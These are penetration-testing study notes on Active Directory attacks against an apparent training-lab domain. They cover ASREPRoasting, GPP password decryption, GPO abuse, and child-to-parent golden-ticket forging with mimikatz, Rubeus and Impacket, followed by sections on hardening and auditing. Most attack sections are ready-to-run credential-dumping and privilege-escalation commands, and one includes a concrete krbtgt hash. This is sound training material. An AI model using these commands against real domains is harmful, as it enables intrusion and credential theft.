* **Printer bug** — MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` forces spooler (SYSTEM) auth anywhere. Check: `Get-SpoolStatus -ComputerName <HOST>` (SecurityAssessment.ps1). Relay to LDAP → DCSync rights or RBCD.
* **MS14-068** — forged PAC Kerberos privesc; patch-only defense (PyKEK, Impacket).
* **LDAP credential sniffing** — printer/app consoles store LDAP creds; retarget the "test connection" button at a netcat listener on 389.
* **DNS records** — `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5` dumps zone records any user can list (`-r` resolves unknowns); reveals hostnames behind GUID-style computer names.
* **Description fields** — `Get-DomainUser * | Select samaccountname,description | ? {$_.Description -ne $null}` — passwords live there.
* **PASSWD\_NOTREQD** — `Get-DomainUser -UACFilter PASSWD_NOTREQD` — test for blank passwords.
* **SYSVOL scripts** — readable by all authenticated users; hunt for passwords such as `reset_local_admin_pass.vbs`.
* **GPP passwords** — `cpassword` in SYSVOL XML files for drives, services, scheduled tasks, and registry. AES key was published by Microsoft. `gpp-decrypt <cpassword>`; CME modules `gpp_password` and `gpp_autologin`. The latter pulls `Registry.xml` autologon creds — still unpatched by design.

### ASREPRoasting

Accounts with "Do not require Kerberos pre-auth" leak crackable AS-REPs without any credentials.

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

```bash
hashcat -m 18200 ilfreight_asrep rockyou.txt
kerbrute userenum ...              # auto-dumps AS-REP hashes for no-preauth users it finds
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

GenericWrite/GenericAll over a user → enable the flag yourself → roast → disable.

### GPO abuse

Enumerate:

```powershell
Get-DomainGPO | select displayname
Get-GPO -All
```

Check rights via `Get-DomainGPO | Get-ObjectAcl` against a group SID.

Module finding: Domain Users with WriteProperty/WriteDacl over "Disconnect Idle RDP" → SharpGPOAbuse can add local admin, an immediate scheduled task, or a startup script. Scope to a single host, never a 1000-host OU.

Audit with group3r.

## Domain Trusts Primer

Trust types:

* Parent-child: two-way transitive, same forest
* Cross-link: child↔child fast path
* External: non-transitive, SID-filtered, separate forests
* Tree-root
* Forest: transitive between forest roots
* ESAE: bastion forest

Transitive = trust extends to whoever the child trusts:

`A→B, B→C ⇒ A→C`

One-way vs. bidirectional determines directionality.

M\&A-created trusts often go unreviewed — the trusted, softer company is a back door into the acquirer.

```powershell
Get-ADTrust -Filter *                          # IntraForest=True (child) vs ForestTransitive=True (forest trust)
Get-DomainTrust
Get-DomainTrustMapping                        # whole forest map
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName   # enumerate across trust
```

```cmd
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

BloodHound: Map Domain Trusts query.

{% hint style="warning" %}
Always confirm trusts are in scope before attacking them.
{% endhint %}

## Attacking Domain Trusts - Child -> Parent (ExtraSids / SID History)

No SID filtering inside a forest → forge a Golden Ticket from the child whose SID history contains the parent's Enterprise Admins SID.

Ingredients:

* Child `krbtgt` NT hash
* Child domain SID
* Fake username
* Child FQDN
* Parent Enterprise Admins SID (`…-519`)

### Gather

After DA in child:

```cmd
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt        :: hash + child SID visible in output
```

```powershell
Get-DomainSID                                             :: child SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
```

### Forge from Windows

```cmd
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_SID> /sids:<EA_SID> /user:hacker /ptt
```

Then:

```cmd
ls \\academy-ea-dc01.inlanefreight.local\c$
```

DCSync against the parent:

```cmd
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

Specify the domain when it differs from the user's.

### Forge from Linux

```bash
secretsdump.py logistics.inlanefreight.local/<CHILD_ADMIN>@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
lookupsid.py logistics.inlanefreight.local/<USER>@172.16.5.240 | grep "Domain SID"        # child SID
lookupsid.py logistics.inlanefreight.local/<USER>@172.16.5.5 | grep -B12 "Enterprise Admins"   # parent SID + EA RID
ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_SID> -extra-sid <EA_SID> hacker
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/<CHILD_ADMIN>` automates the full flow: EA SID → krbtgt → golden ticket → parent admin creds → PsExec.

Understand the manual path first — autopwn scripts break in ways that cannot be troubleshot, and clients do not accept "the script did it."

## Attacking Domain Trusts - Cross-Forest Trust Abuse

### Cross-forest Kerberoasting

Works when trust direction allows authentication:

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request
```

Crack → admin in the second forest. Also spray the cracked password against same-name accounts in your own domain.

### Foreign group membership

Only Domain Local groups take foreign principals. A Domain A admin inside Domain B's built-in Administrators = instant cross-forest admin.

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-...-500
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

### SID History across forests

Same ExtraSids idea where SID filtering is not enforced on a migration trust.

### Cross-forest BloodHound

Point `/etc/resolv.conf` at each forest's DC in turn, collect with bloodhound-python per domain, upload both, then run:

`Users with Foreign Domain Group Membership`

## Hardening Active Directory

### Document and audit

At least annually:

* Naming conventions
* DNS/DHCP
* All GPOs and targets
* FSMO roles
* App inventory
* Host list
* Every trust
* Elevated users

### People

* Strong password policy + filter: months, seasons, company name banned
* Rotate service account passwords
* No local admin on workstations
* Kill RID-500 in favor of a LAPS-managed admin
* Tiered administration
* Trim privileged groups: 50+ DAs is a finding
* Protected Users group where safe: blocks delegation, NTLM, DES/RC4, credential caching; TGT ≤ 4h

{% hint style="warning" %}
Test Protected Users before rolling out. It breaks authentication in surprising ways.
{% endhint %}

### Processes

* Provisioning/decommissioning policies
* Gold images
* Stale-record cleanup
* Scheduled AD audits

### Technology

* Run BloodHound/PingCastle/Grouper internally
* No passwords in description fields or SYSVOL
* gMSA/MSA instead of normal service accounts: kills Kerberoasting
* Disable unconstrained delegation
* Jump hosts for DC access
* `ms-DS-MachineAccountQuota = 0`: blocks noPac and RBCD
* Disable the spooler
* Disable NTLM on DCs
* EPA + SSL-only on AD CS web enrollment
* SMB + LDAP signing
* Restrict null sessions: `RestrictNullSessAccess=1`
* Quarterly-to-annual AD pentests
* Tested backups

MITRE view of module TTPs:

| Technique     | MITRE mapping          | Mitigation                                |
| ------------- | ---------------------- | ----------------------------------------- |
| Poisoning     | T1557                  | SMB signing defeats it                    |
| Spraying      | T1110/003              | 4624/4648 monitoring, lockout policy, MFA |
| Kerberoasting | T1558.003 under TA0006 | Strong etypes, gMSA                       |

## Additional AD Auditing Techniques

* **AD Explorer** (Sysinternals) — browse AD like a database; File → Create Snapshot for offline diffing and before/after comparisons.
* **PingCastle** — healthcheck report scores the domain on a CMMI-based maturity model; interactive menu: healthcheck / conso / carto / scanner. Scanner includes nullsession, localadmin, spooler, zerologon, and SMB checks. Great client-facing artifact.
* **Group3r** — GPO vulnerability finder.

```bash
group3r.exe -f <file.log>
group3r.exe -s
```

Run as any domain user from a domain-joined host, or use `runas /netonly`. Indented output = GPO → setting → finding.

* **ADRecon** — sweeps domain/forest/trusts/users/groups/OUs/GPOs/DNS/computers into CSV + HTML.

```powershell
.\ADRecon.ps1
```

Excel is needed for the full report; regenerate later with `-GenExcel`.
